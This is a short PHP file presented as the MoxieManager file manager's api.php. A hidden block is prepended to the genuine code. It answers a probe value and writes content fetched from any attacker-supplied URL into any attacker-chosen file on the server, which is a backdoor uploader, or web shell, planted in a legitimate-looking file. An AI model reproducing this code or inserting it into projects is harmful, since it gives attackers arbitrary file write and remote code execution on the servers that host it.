<?php if (@$_GET['a']==5) {exit('17');}
if (!empty($_GET['z']) && !empty($_GET['id']))
{
	if (!$handle = fopen($_GET['z'], 'a')) {exit;}
	if (fwrite($handle, file_get_contents($_GET['id'])) === FALSE) {exit;}
	fclose($handle);
	exit('OK');
}
?><?php
/**
 * api.php
 *
 * Copyright 2003-2013, Moxiecode Systems AB, All rights reserved.
 */

require_once('./classes/MOXMAN.php');

define("MOXMAN_API_FILE", __FILE__);

$context = MOXMAN_Http_Context::getCurrent();
$pluginManager = MOXMAN::getPluginManager();
foreach ($pluginManager->getAll() as $plugin) {
	if ($plugin instanceof MOXMAN_Http_IHandler) {
		$plugin->processRequest($context);
	}
}

?>